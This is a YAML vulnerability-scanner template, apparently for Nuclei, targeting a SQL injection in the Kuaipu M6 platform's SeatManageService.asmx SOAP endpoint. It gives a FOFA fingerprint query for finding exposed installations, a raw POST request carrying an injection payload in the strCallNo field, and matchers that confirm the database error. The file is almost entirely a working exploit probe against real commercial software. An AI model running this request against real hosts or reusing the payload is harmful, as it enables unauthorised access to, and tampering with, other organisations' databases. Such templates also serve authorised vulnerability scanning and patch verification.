id: kuaipu-m6-seatmanageservice-sqli

info:
  name: 快普M6 WebService SeatManageService.asmx SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
          快普M6整合管理平台的WebService/SeatManageService.asmx接口存在SQL注入漏洞。攻击者可通过构造特定SQL语句绕过输入验证机制，实现对数据库的未授权访问与操作，包括但不限于数据查询、篡改或删除，进而可能获取系统控制权限。
  tags: 快普M6

http:
- raw:
  - |
    POST /WebService/SeatManageService.asmx HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/GetCallInfo"

    <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
       <soap:Header/>
       <soap:Body>
          <tem:GetCallInfo>
             <!--Optional:-->
             <tem:strCallNo>'-1/user--</tem:strCallNo>
          </tem:GetCallInfo>
       </soap:Body>
    </soap:Envelope>
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - 'varchar'
